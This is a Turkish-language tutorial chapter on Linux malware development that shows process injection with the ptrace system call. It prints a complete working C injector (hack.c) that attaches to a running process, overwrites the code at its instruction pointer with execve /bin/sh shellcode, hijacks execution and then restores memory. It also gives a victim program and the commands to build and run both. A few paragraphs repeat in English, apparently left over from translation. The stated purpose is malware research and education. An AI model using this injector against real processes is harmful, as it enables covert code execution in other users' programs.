\newpage
\subsection{100. Linux kötü amaçlı yazılım geliştirme 3: ptrace ile Linux işlem enjeksiyonu. Basit C örneği.}

﷽


![linux](./images/138/2024-11-22_19-12.png){width="80%"}     

Bilinen enjeksiyon tekniklerinin sayısı Windows makinelerde çok büyük, örneğin:
[ilk](https://cocomelonc.github.io/tutorial/2021/09/18/malware-injection-1.html), [ikinci](https://cocomelonc.github.io/tutorial/2021/11/20/malware-injection-4.html) veya [üçüncü](https://cocomelonc.github.io/tutorial/2021/11/22/malware-injection-5.html) örnekler blogumdan.   

Bugün, `ptrace` sistem çağrısını kullanarak harika bir Linux enjeksiyon tekniğini göstereceğim. `ptrace`'ı, diğer işlemleri incelemek, değiştirmek ve hatta ele geçirmek için kişisel anahtarınız olarak düşünün.      

### ptrace

`ptrace`, uzak işlemleri hata ayıklamanıza izin veren bir sistem çağrısıdır. Başlatan işlem, hata ayıklanan işlemin belleğini ve yazmaçlarını inceleyebilir ve değiştirebilir. Örneğin, GDB, hata ayıklanan süreci kontrol etmek için ptrace kullanır.   

![linux](./images/138/2024-11-22_21-22.png){width="80%"}     

Ptrace, aşağıdakiler gibi birkaç faydalı hata ayıklama işlemi sunar:

`PTRACE_ATTACH` - bir sürece bağlanmanıza izin verir, hata ayıklanan süreci duraklatır    
`PTRACE_PEEKTEXT` - başka bir sürecin adres alanından veri okumanıza izin verir   
`PTRACE_POKETEXT` - başka bir sürecin adres alanına veri yazmanıza izin verir   
`PTRACE_GETREGS` - sürecin mevcut kayıt durumu okur   
`PTRACE_SETREGS` - sürecin kayıt durumu yazar   
`PTRACE_CONT` - hata ayıklanan sürecin yürütülmesine devam eder         

### pratik örnek

Bu adım adım eğitimde şunları göstereceğim:   

Çalışan bir sürece bağlanma.   
Özel shellcode enjekte etme.   
Yürütmeyi ele geçirme.   
Yürütmeden sonra orijinal durumu geri yükleme.   

Her şeyi basit bir pratik C örneği ile açıklayacağız. Haydi başlayalım!         

İlk yapmamız gereken, ilgilendiğimiz sürece bağlanmaktır. Bunu yapmak için, `ptrace` çağrısını `PTRACE_ATTACH` parametresi ile kullanmak yeterlidir:    

```cpp
printf("attaching to process %d\n", target_pid);
if (ptrace(PTRACE_ATTACH, target_pid, NULL, NULL) == -1) {
  perror("failed to attach");
  return 1;
}
```

Bu, işlemi durdurur ve belleğini ve yazmaçlarını incelememizi sağlar.     

İşlemci yazmaçlarında herhangi bir değişiklik yapmadan önce, mevcut durumlarını yedeklemeliyiz. Bu, daha sonraki bir aşamada yürütmeye devam etmemizi sağlar:     

```cpp
struct user_regs_struct target_regs;
//...
//...
// get the current registers
printf("reading process registers\n");
ptrace(PTRACE_GETREGS, target_pid, NULL, &target_regs);
```

Using `PTRACE_PEEKDATA`, we read the memory at the instruction pointer (`RIP`). This is crucial for restoring the process to its original state after injection. For this reason I just created `read_mem` function:     

`PTRACE_PEEKDATA` kullanarak, talimat işaretçisindeki (`RIP`) belleği okuyoruz.
Bu, enjeksiyondan sonra süreci orijinal durumuna geri yüklemek için çok önemlidir.
Bu nedenle, `read_mem` adlı bir fonksiyon oluşturdum:    

```cpp
// read memory from the target process
void read_mem(pid_t target_pid, long addr, char *buffer, int len) {
  union data_chunk {
    long val;
    char bytes[sizeof(long)];
  } chunk;
  int i = 0;
  while (i < len / sizeof(long)) {
    chunk.val = ptrace(PTRACE_PEEKDATA, target_pid, addr + i * sizeof(long), NULL);
    memcpy(buffer + i * sizeof(long), chunk.bytes, sizeof(long));
    i++;
  }
  int remaining = len % sizeof(long);
  if (remaining) {
    chunk.val = ptrace(PTRACE_PEEKDATA, target_pid, addr + i * sizeof(long), NULL);
    memcpy(buffer + i * sizeof(long), chunk.bytes, remaining);
  }
}
```

Bu fonksiyonun adım adım işleyişini göstereyim.    

`ptrace`, belleği `sizeof(long)` baytlık parçalar halinde okur. Bu birlik (union), veriyi `ptrace` işlemleri için `long` olarak ele almamıza ve aynı zamanda bireysel baytlara erişmemize olanak tanır (`bytes` array):   

```cpp
union data_chunk {
  long val;
  char bytes[sizeof(long)];
} chunk;
```

Then we read full `sizeof(long)` chunks:     

```cpp
int i = 0;
while (i < len / sizeof(long)) {
  chunk.val = ptrace(PTRACE_PEEKDATA, target_pid, addr + i * sizeof(long), NULL);
  memcpy(buffer + i * sizeof(long), chunk.bytes, sizeof(long));
  i++;
}
```

Gördüğünüz gibi, burada hedef işlemin belirli bir bellek adresinden bir `long` (genellikle `64-bit` sistemlerde `8 bayt`) okuyoruz. Ardından, okunan veri `memcpy` kullanılarak tampon içine kopyalanır. Bu işlem, tüm `sizeof(long)` uzunluğundaki bloklar okunana kadar devam eder.   

Daha sonra kalan baytları ele alırız:   

```cpp
int remaining = len % sizeof(long);
if (remaining) {
  chunk.val = ptrace(PTRACE_PEEKDATA, target_pid, addr + i * sizeof(long), NULL);
  memcpy(buffer + i * sizeof(long), chunk.bytes, remaining);
}
```

Mantık basittir: Eğer uzunluk (`len`) `sizeof(long)`'un katı değilse, okunması gereken ekstra baytlar olabilir. Fonksiyon, bu kalan baytları okumak için bellekte bir `long` daha okur ve sadece gerekli baytları tampona kopyalar.   

So, as a result, the entire memory block (`len` bytes) from the target process starting at `addr` is now stored in `buffer`.      

Sonuç olarak, hedef işlemin belirli bir adresinden başlayan `len` baytlık tüm bellek bloğu `buffer` içine kaydedilir.    

`PTRACE_POKEDATA` ile, özel shellcode'umuzu hedef işlemin belleğine `RIP` adresinde enjekte ediyoruz.     

```cpp
// write memory into the target process
void write_mem(pid_t target_pid, long addr, char *buffer, int len) {
  union data_chunk {
    long val;
    char bytes[sizeof(long)];
  } chunk;
  int i = 0;
  while (i < len / sizeof(long)) {
    memcpy(chunk.bytes, buffer + i * sizeof(long), sizeof(long));
    ptrace(PTRACE_POKEDATA, target_pid, addr + i * sizeof(long), chunk.val);
    i++;
  }
  int remaining = len % sizeof(long);
  if (remaining) {
    memcpy(chunk.bytes, buffer + i * sizeof(long), remaining);
    ptrace(PTRACE_POKEDATA, target_pid, addr + i * sizeof(long), chunk.val);
  }
}
```

Gördüğünüz gibi, bu fonksiyon `read_mem` fonksiyonuna benzer, ancak **belleğe yazma** mantığı için kullanılır.      

Bir sonraki aşamada, işlemin komut işaretçisini (`RIP`) değiştirilerek enjekte edilen yükün çalıştırılması sağlanır:     

```cpp
ptrace(PTRACE_CONT, target_pid, NULL, NULL);
```

Yük çalıştırıldıktan sonra, orijinal bellek talimatları geri yüklenerek işlemin çökmesi veya iz bırakması önlenir:      

```cpp
write_mem(target_pid, target_regs.rip, original_code, payload_len);
```

Son olarak, hedef işlemden ayrılarak normal çalışmasına devam etmesine izin verilir:     

```cpp
ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
```

Böylece, kod enjeksiyonu yapan "zararlı yazılımımızın" tam kaynak kodu şu şekilde görünüyor (`hack.c`):   

```cpp
/*
 * hack.c
 * practical example of linux process injection
 * author @cocomelonc
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <unistd.h>

// read memory from the target process
void read_mem(pid_t target_pid, long addr, char *buffer, int len) {
  union data_chunk {
    long val;
    char bytes[sizeof(long)];
  } chunk;
  int i = 0;
  while (i < len / sizeof(long)) {
    chunk.val = ptrace(PTRACE_PEEKDATA, target_pid, addr + i * sizeof(long), 
    NULL);
    memcpy(buffer + i * sizeof(long), chunk.bytes, sizeof(long));
    i++;
  }
  int remaining = len % sizeof(long);
  if (remaining) {
    chunk.val = ptrace(PTRACE_PEEKDATA, target_pid, addr + i * sizeof(long), 
    NULL);
    memcpy(buffer + i * sizeof(long), chunk.bytes, remaining);
  }
}

// write memory into the target process
void write_mem(pid_t target_pid, long addr, char *buffer, int len) {
  union data_chunk {
    long val;
    char bytes[sizeof(long)];
  } chunk;
  int i = 0;
  while (i < len / sizeof(long)) {
    memcpy(chunk.bytes, buffer + i * sizeof(long), sizeof(long));
    ptrace(PTRACE_POKEDATA, target_pid, addr + i * sizeof(long), chunk.val);
    i++;
  }
  int remaining = len % sizeof(long);
  if (remaining) {
    memcpy(chunk.bytes, buffer + i * sizeof(long), remaining);
    ptrace(PTRACE_POKEDATA, target_pid, addr + i * sizeof(long), chunk.val);
  }
}

int main(int argc, char *argv[]) {
  if (argc != 2) {
    printf("usage: %s <target_pid>\n", argv[0]);
    return 1;
  }

  pid_t target_pid = atoi(argv[1]);
  char payload[] = "\x48\x31\xf6\x56\x48\xbf\x2f\x62"
  "\x69\x6e\x2f\x2f\x73\x68\x57\x54"
  "\x5f\x6a\x3b\x58\x99\x0f\x05"; // execve /bin/sh
  int payload_len = sizeof(payload) - 1;
  char original_code[payload_len];

  struct user_regs_struct target_regs;

  // attach to the target process
  printf("attaching to process %d\n", target_pid);
  if (ptrace(PTRACE_ATTACH, target_pid, NULL, NULL) == -1) {
    perror("failed to attach :(");
    return 1;
  }
  waitpid(target_pid, NULL, 0);

  // get the current registers
  printf("reading process registers\n");
  ptrace(PTRACE_GETREGS, target_pid, NULL, &target_regs);

  // backup the memory at RIP
  printf("backing up target memory\n");
  read_mem(target_pid, target_regs.rip, original_code, payload_len);

  // inject the payload
  printf("injecting payload\n");
  write_mem(target_pid, target_regs.rip, payload, payload_len);

  // hijack execution
  printf("hijacking process execution\n");
  ptrace(PTRACE_CONT, target_pid, NULL, NULL);

  // wait for the payload to execute
  wait(NULL);

  // restore the original code
  printf("restoring original process memory\n");
  write_mem(target_pid, target_regs.rip, original_code, payload_len);

  // detach from the process
  printf("detaching from process\n");
  ptrace(PTRACE_DETACH, target_pid, NULL, NULL);

  printf("injection complete\n");
  return 0;
}
```

Ama burada bir durum var. *Neden işlem enjeksiyon kodunda `waitpid` kullanıyoruz?*     
Bir işlemi `ptrace` ile bağladığımızda (`PTRACE_ATTACH` aracılığıyla), hedef işlem hemen durmaz. İşletim sistemi, hata ayıklayıcının (enjeksiyon yapan kodumuzun) kontrolü ele aldığını belirten bir sinyal gönderene kadar işlem yürütülmeye devam eder. Hedef işlem bu duraklama durumuna girene kadar yürütücümüzün beklemesini sağlamak için `waitpid` kullanırız:      

```cpp
ptrace(PTRACE_ATTACH, target_pid, NULL, NULL);
waitpid(target_pid, NULL, 0);
```

`waitpid` olmadan, hedef işlem tamamen durdurulmadan önce belleği okumaya veya değiştirmeye çalışabiliriz, bu da tanımsız davranışlara yol açabilir.      

Ayrıca, işlem enjeksiyonunda, *enjeksiyon yapılan shellcode'un çalışmasını tamamladığını* algılamamız gerekebilir. Bunu yapmak için `int 0x3` talimatı gibi bir yazılım kesmesi kullanırız, bu da hedef işlemde `SIGTRAP` sinyalini tetikler. Bu sinyal işlemi duraklatır ve `waitpid` ile tekrar kontrol sağlamamıza olanak tanır.    

Peki ya `wait`? `wait` nedir ve ne zaman kullanılır?     

`wait` fonksiyonu, `waitpid`'in daha basit bir versiyonudur. Herhangi bir alt sürecin durum değiştirmesini bekler. Ancak `waitpid` gibi belirli bir işlem kimliği (PID) belirlememize veya gelişmiş seçenekler kullanmamıza izin vermez.    

İşlem enjeksiyonu bağlamında genellikle `wait` kullanmayız, çünkü belirli bir işlemi hassas bir şekilde kontrol etmemiz gerekir. Ancak, birden fazla alt sürecin bulunduğu ve hangisinin önce değiştiğini umursamadığımız durumlarda `wait` kullanılabilir.     

Bu nedenle, `waitpid`'i stratejik olarak kullanarak sorunsuz ve güvenilir işlem enjeksiyonu sağlayabiliriz.       

Basitlik açısından, en basit payload'u kullandım:     

```cpp
char payload[] = "\x48\x31\xf6\x56\x48\xbf\x2f\x62"
"\x69\x6e\x2f\x2f\x73\x68\x57\x54"
"\x5f\x6a\x3b\x58\x99\x0f\x05"; // execve /bin/sh
```

### demo

Öncelikle, gösterim amacıyla bir "kurban" sürece ihtiyacımız var.   

Sonsuz döngü içinde çalışan, belirli aralıklarla mesaj yazdıran basit bir "kurban" işlemi yazdım.Bu program, gerçek bir çalışan süreci simüle eder:    

```cpp
/*
 * meow.c
 * simple "victim" process for injection testing
 * author @cocomelonc
 * https://cocomelonc.github.io/malware/2024/11/22/linux-hacking-3.html
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
  printf("victim process started. PID: %d\n", getpid());

  while (1) {
    printf("meow-meow... PID: %d\n", getpid());
    sleep(5); // simulate periodic activity
  }

  return 0;
}
```

Kurban süreci derleyelim:     

```bash
gcc meow.c -o meow
```

![linux](./images/138/2024-11-22_20-58.png){width="80%"}     

ve `hack.c` enjeksiyon kodunu derleyelim:     

```bash
gcc -z execstack hack.c -o hack
```

![linux](./images/138/2024-11-22_20-59.png){width="80%"}     

Ubuntu 24.04 VM'de önce kurban süreci çalıştırın:    

```bash
./meow
```

Kurban sürecinin yazdırdığı `PID`'yi not edin:     

![linux](./images/138/2024-11-22_21-04.png){width="80%"}     

Bizim örneğimizde `PID = 5987`.    

Şimdi bu `PID`'yi hedef alarak enjeksiyon yapabiliriz. Örneğin:     

```bash
./hack 5987
```

![linux](./images/138/2024-11-22_21-08.png){width="80%"}     

Bu, kurban sürece bağlanarak payload'umuzu enjekte edecektir. Bu sırada kurban süreç çalışmaya devam eder:      

![linux](./images/138/2024-11-22_19-13_1.png){width="80%"}     

![linux](./images/138/2024-11-22_19-13.png){width="80%"}     

Gördüğünüz gibi, her şey mükemmel çalıştı! =^..^=

### son sözler

Bu pratik örnek, `ptrace`'in özel shellcode enjekte etmek ve bir işlemin yürütme akışını değiştirmek için nasıl kullanılabileceğini göstermektedir.      

Elbette `ptrace` ile yapılan bu teknik yeni değil, ancak meşru işlevselliğin kötüye nasıl kullanılabileceğini vurgulamaktadır.       

Umarım bu pratik örnek, kötü amaçlı yazılım araştırmacıları, Linux programcıları ve Linux çekirdek programlama ve kod enjeksiyon teknikleriyle ilgilenen herkes için faydalı olur.    

*Not: Linux ayrıca `process_vm_readv()` ve `process_vm_writev()` sistem çağrılarını sunar, bunlar işlem belleğini okumak ve yazmak için kullanılabilir.*       

[ptrace](https://docs.kernel.org/arch/powerpc/ptrace.html)      
[Linux malware development 1: intro to kernel hacking. Simple C example](https://cocomelonc.github.io/linux/2024/06/20/linux-kernel-hacking-1.html)      
[Linux malware development 2: find process ID by name. Simple C example](https://cocomelonc.github.io/linux/2024/09/16/linux-hacking-2.html)      
[github'taki kaynak kod](https://github.com/cocomelonc/meow/tree/master/2024-11-22-linux-hacking-3)    
